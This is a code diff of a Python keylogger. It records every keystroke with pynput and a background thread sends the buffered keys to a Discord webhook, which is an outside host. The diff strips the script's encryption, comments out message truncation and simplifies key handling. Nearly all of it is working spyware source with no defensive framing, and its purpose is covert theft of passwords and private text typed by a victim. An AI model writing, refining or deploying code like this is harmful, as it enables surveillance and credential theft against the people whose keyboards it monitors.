@@ -1,23 +1,7 @@
-from cryptography.fernet import Fernet
 from pynput import keyboard
 import requests
-import os
 import threading
 import time
-
-# Generate or load the encryption key
-key_file = "encryption_key.key"
-
-if os.path.exists(key_file):
-    with open(key_file, "rb") as f:
-        key = f.read()
-    cipher = Fernet(key)
-else:
-    key = Fernet.generate_key()
-    with open(key_file, "wb") as f:
-        f.write(key)
-    print("Encryption key generated and saved as 'encryption_key.key'")
-    cipher = Fernet(key)
 
 # Discord Webhook URL
 discord_webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
@@ -39,9 +23,9 @@ def send_to_discord():
                 # Prepare the message content
                 message_content = "".join(keystroke_buffer)
 
-                # Truncate to Discord's max message size if needed
-                if len(message_content) > 2000:
-                    message_content = message_content[:1997] + "..."
+                # # Truncate to Discord's max message size if needed
+                # if len(message_content) > 2000:
+                #     message_content = message_content[:1997] + "..."
 
                 # Send to Discord
                 payload = {"content": f"**Keystrokes Logged:**\n```\n{message_content}\n```"}
@@ -62,22 +46,14 @@ def send_to_discord():
 def on_press(key):
     """Log each keystroke and add it to the buffer."""
     try:
-        if hasattr(key, 'char') and key.char is not None:
-            keystroke = key.char  # Character keys
-        else:
-            keystroke = f"[{key}]"  # Special keys (e.g., [Shift], [Ctrl])
-
-        # Decode to string if bytes and append to buffer
-        if isinstance(keystroke, bytes):
-            keystroke_buffer.append(keystroke.decode(errors="ignore"))
-        else:
-            keystroke_buffer.append(keystroke)
+        keystroke = key.char if hasattr(key, 'char') and key.char is not None else f"[{key}]"
+        keystroke_buffer.append(keystroke)
     except Exception as e:
         print(f"Error logging key press: {e}")
 
 
 def main():
-    """Main function to start the keylogger and sending thread."""
+    """Start the keylogger and sending thread."""
     # Start the Discord-sending thread
     threading.Thread(target=send_to_discord, daemon=True).start()
 
